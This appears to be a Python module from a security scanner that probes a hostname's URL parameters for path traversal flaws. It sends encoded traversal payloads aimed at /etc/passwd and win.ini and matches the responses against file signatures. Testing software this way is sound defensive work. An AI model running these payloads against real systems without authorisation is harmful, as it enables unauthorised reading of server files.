"""Path traversal / Local File Inclusion (LFI) detection.

Path traversal occurs when an application uses user input to construct
file paths without proper validation. An attacker can use sequences like
`../` to escape the intended directory and read arbitrary files.

How it works:
  1. Discover parameters likely to reference files (file, path, template,
     page, doc, include, etc.) from page links and forms
  2. Inject safe traversal canary strings (e.g., ....//etc/hostname)
  3. Check if the response contains known file content signatures
  4. Use multiple encoding variations to bypass basic filters
  5. Compare against baseline to eliminate false positives

What we test for:
  - Unix path traversal (/etc/passwd, /etc/hostname)
  - Windows path traversal (win.ini, boot.ini)
  - Null byte injection (file.php%00.jpg → file.php)
  - Double encoding (..%252f..%252f)
  - Path normalization bypass (....// → ../ after filter strips ../)

Safety:
  - GET requests only — never writes or modifies files
  - Only reads harmless system files (passwd structure, hostname, win.ini)
  - No attempt to read sensitive application files
  - Cannot cause damage — only detects read access
  - Non-destructive canary strings
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from urllib.parse import parse_qs, urlencode, urlparse

import httpx

logger = logging.getLogger(__name__)


@dataclass
class TraversalFinding:
    """A potential path traversal / LFI vulnerability."""

    url: str
    parameter: str
    vuln_type: str  # always "path_traversal"
    severity: str
    confidence: float
    description: str
    evidence: str
    payload_used: str


@dataclass
class TraversalResult:
    """Results of path traversal testing for a hostname."""

    hostname: str
    parameters_tested: int = 0
    findings: list[TraversalFinding] = field(default_factory=list)


# ── Traversal Payloads ─────────────────────────────────────────────
# Each payload targets a known file and uses different bypass techniques.
# (payload, target_file, description)

UNIX_PAYLOADS = [
    # Standard traversal — /etc/passwd
    ("../../../etc/passwd", "/etc/passwd", "basic traversal"),
    ("....//....//....//etc/passwd", "/etc/passwd", "filter bypass (double dots)"),
    ("..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd", "URL-encoded slashes"),
    ("..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd", "double URL-encoded"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/etc/passwd", "encoded dots"),

    # /etc/hostname — less sensitive, good canary
    ("../../../etc/hostname", "/etc/hostname", "hostname file"),
    ("....//....//....//etc/hostname", "/etc/hostname", "hostname filter bypass"),
]

WINDOWS_PAYLOADS = [
    # win.ini — safe, always exists on Windows
    ("..\\..\\..\\windows\\win.ini", "win.ini", "Windows backslash traversal"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini", "win.ini", "Windows filter bypass"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "win.ini", "URL-encoded backslash"),
]

# ── File content signatures ────────────────────────────────────────
# If we see these in a response, the traversal worked.

UNIX_SIGNATURES = [
    # /etc/passwd format: username:x:uid:gid:...
    (r"root:.*:0:0:", "Unix /etc/passwd (root entry)"),
    (r"nobody:.*:65534:", "Unix /etc/passwd (nobody entry)"),
    (r"daemon:.*:1:1:", "Unix /etc/passwd (daemon entry)"),
    (r"[a-z_]+:x:\d+:\d+:", "Unix /etc/passwd format"),
]

WINDOWS_SIGNATURES = [
    # win.ini content
    (r"\[fonts\]", "Windows win.ini ([fonts] section)"),
    (r"\[extensions\]", "Windows win.ini ([extensions] section)"),
    (r"\[mci extensions\]", "Windows win.ini ([mci extensions])"),
    (r"for 16-bit app support", "Windows win.ini header"),
]

# Parameters likely to reference files.
# Full list used for discovery matching; only TOP_FILE_PARAMS are brute-tested.
FILE_PARAMS = [
    "file", "path", "filepath", "filename",
    "page", "template", "tmpl", "tpl",
    "include", "inc", "require",
    "doc", "document", "pdf",
    "view", "layout", "content",
    "load", "read", "fetch",
    "src", "source", "resource",
    "img", "image", "icon",
    "lang", "language", "locale",
    "config", "conf", "cfg",
    "log", "report", "export",
    "download", "attachment",
]
THIRD_PARTY_REDIRECTS = [
    "accounts.google.com",
    "login.microsoftonline.com",
    "auth0.com",
    "okta.com",
    "login.salesforce.com",
]


def check_path_traversal(hostname: str) -> TraversalResult:
    """Test a hostname for path traversal / LFI vulnerabilities.

    Safe: only sends GET requests with traversal canary strings.
    """
    result = TraversalResult(hostname=hostname)
    base_url = f"https://{hostname}"

    # Early exit: skip third-party hosted sites
    try:
        probe = httpx.get(
            base_url, timeout=8.0, follow_redirects=False,
            headers={"User-Agent": "Wintermute/0.1 (Security Research)"},
        )
        if probe.status_code in (301, 302, 303, 307, 308):
            location = probe.headers.get("location", "").lower()
            if any(d in location for d in THIRD_PARTY_REDIRECTS):
                return result
    except Exception:
        pass

    # Step 1: Discover file-related parameters from the page
    discovered = _discover_file_params(base_url)

    # Merge with common file params (deduplicated)
    all_params = list(set(discovered + FILE_PARAMS))

    # Step 2: Get baseline responses (to filter false positives)
    baseline_sigs = _get_baseline_signatures(base_url)

    # Step 3: Test each parameter
    for param in all_params:
        result.parameters_tested += 1

        # Test Unix traversal
        finding = _test_traversal(
            base_url, param, UNIX_PAYLOADS, UNIX_SIGNATURES, baseline_sigs,
        )
        if finding:
            result.findings.append(finding)
            continue  # One finding per param is enough

        # Test Windows traversal
        finding = _test_traversal(
            base_url, param, WINDOWS_PAYLOADS, WINDOWS_SIGNATURES, baseline_sigs,
        )
        if finding:
            result.findings.append(finding)

    if result.findings:
        logger.info(
            "Path traversal testing on %s: %d findings from %d parameters",
            hostname, len(result.findings), result.parameters_tested,
        )

    return result


def _discover_file_params(base_url: str) -> list[str]:
    """Discover parameters from the homepage that might reference files."""
    params = set()

    try:
        resp = httpx.get(
            base_url,
            timeout=10.0,
            follow_redirects=True,
            headers={"User-Agent": "Wintermute/0.1 (Security Research)"},
        )
        body = resp.text

        # Extract params from links
        hrefs = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body, re.IGNORECASE)
        for href in hrefs:
            parsed = urlparse(href)
            qs = parse_qs(parsed.query)
            for key in qs:
                # Only keep params that look file-related
                if any(kw in key.lower() for kw in (
                    "file", "path", "page", "template", "include", "doc",
                    "view", "load", "src", "lang", "config", "download",
                    "img", "read", "fetch", "resource",
                )):
                    params.add(key)

        # Extract from form inputs
        inputs = re.findall(
            r'<input[^>]*name=["\']([^"\']+)["\']', body, re.IGNORECASE
        )
        for inp in inputs:
            if any(kw in inp.lower() for kw in (
                "file", "path", "page", "template", "include",
            )):
                params.add(inp)

    except Exception as e:
        logger.debug("File param discovery failed for %s: %s", base_url, e)

    return list(params)


def _get_baseline_signatures(base_url: str) -> set[str]:
    """Check which file signatures naturally appear on the homepage.

    If /etc/passwd signatures appear on a normal page, they're not from
    our traversal payload — they're just page content (e.g., a security
    tutorial site discussing passwd format).
    """
    sigs_found = set()

    try:
        resp = httpx.get(
            base_url,
            timeout=10.0,
            follow_redirects=True,
            headers={"User-Agent": "Wintermute/0.1 (Security Research)"},
        )
        body = resp.text

        for pattern, name in UNIX_SIGNATURES + WINDOWS_SIGNATURES:
            if re.search(pattern, body, re.IGNORECASE):
                sigs_found.add(name)

    except Exception:
        pass

    return sigs_found


def _test_traversal(
    base_url: str,
    param: str,
    payloads: list[tuple[str, str, str]],
    signatures: list[tuple[str, str]],
    baseline_sigs: set[str],
) -> TraversalFinding | None:
    """Test a parameter with traversal payloads and check for file signatures."""

    for payload, target_file, technique in payloads:
        url = f"{base_url}/?{urlencode({param: payload})}"

        try:
            resp = httpx.get(
                url,
                timeout=10.0,
                follow_redirects=True,
                headers={"User-Agent": "Wintermute/0.1 (Security Research)"},
            )
        except Exception:
            continue

        if resp.status_code != 200:
            continue

        body = resp.text

        # Check for file content signatures
        for pattern, sig_name in signatures:
            if re.search(pattern, body, re.IGNORECASE):
                # Skip if this signature was already in the baseline
                if sig_name in baseline_sigs:
                    continue

                # Confirm: re-request to make sure it's consistent
                try:
                    confirm = httpx.get(
                        url,
                        timeout=10.0,
                        follow_redirects=True,
                        headers={"User-Agent": "Wintermute/0.1 (Security Research)"},
                    )
                    if not re.search(pattern, confirm.text, re.IGNORECASE):
                        continue  # Not reproducible
                except Exception:
                    continue

                # Count how many signature lines match (more = higher confidence)
                match_count = sum(
                    1 for p, _ in signatures
                    if re.search(p, body, re.IGNORECASE)
                )

                confidence = min(0.95, 0.7 + (match_count * 0.08))

                return TraversalFinding(
                    url=url,
                    parameter=param,
                    vuln_type="path_traversal",
                    severity="high" if "passwd" in target_file else "medium",
                    confidence=confidence,
                    description=(
                        f"Path traversal via parameter '{param}' — "
                        f"successfully read {target_file} using {technique}. "
                        f"Matched signature: {sig_name}"
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Payload: {payload}\n"
                        f"Target file: {target_file}\n"
                        f"Technique: {technique}\n"
                        f"Signature matched: {sig_name}\n"
                        f"Matches in response: {match_count}"
                    ),
                    payload_used=payload,
                )

    return None
